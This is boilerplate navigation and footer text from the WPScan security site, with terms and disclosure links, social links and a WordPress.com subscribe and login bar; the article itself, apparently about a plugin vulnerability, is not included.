* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

